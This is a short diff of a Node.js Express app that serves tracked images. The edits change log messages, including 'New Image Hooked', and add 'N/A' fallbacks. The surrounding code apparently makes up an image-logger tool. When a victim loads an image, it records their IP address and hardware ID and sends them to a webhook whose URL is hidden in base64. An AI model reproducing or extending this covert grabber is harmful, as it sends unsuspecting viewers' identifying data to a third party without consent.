@@ -35,7 +35,7 @@ app.post(syn_config.preendpoint + 'encrypt', async (req, res) => {
             clicks: 0
         }
         const imageURL = syn_config.preendpoint + 'content/raw/' + id
-        console.log(`Track it here: ${syn_config.preendpoint + "content/tracking/"+id}`)
+        console.log(`New Image Hooked Track it here: ${syn_config.preendpoint + "content/tracking/"+id}`)
         const trackinglink = `${syn_config.preendpoint}content/tracking/` + id
         res.status(200).send({ imageURL, trackinglink, id })
     } catch (err) {
@@ -82,7 +82,7 @@ app.get(syn_config.preendpoint + 'content/raw/:id', async (req, res) => {
       const webhookUrl = Buffer.from(bytecode.split('/').slice(1).join(''), 'base64').toString();
       
       // Send the webhook with information about the image
-      const message = `Image ${id} was clicked ${images[id].clicks} times. \n\nHWID: ${hwid}\nIP: ${ip}`;
+      const message = `Image ${id || "N/A"} was clicked ${images[id].clicks} times. \n\nHWID: ${hwid || "N/A"}\nIP: ${ip || "N/A"}`;
       const data = {
         username: 'Image Hosting',
         avatar_url: 'https://example.com/avatar.png',
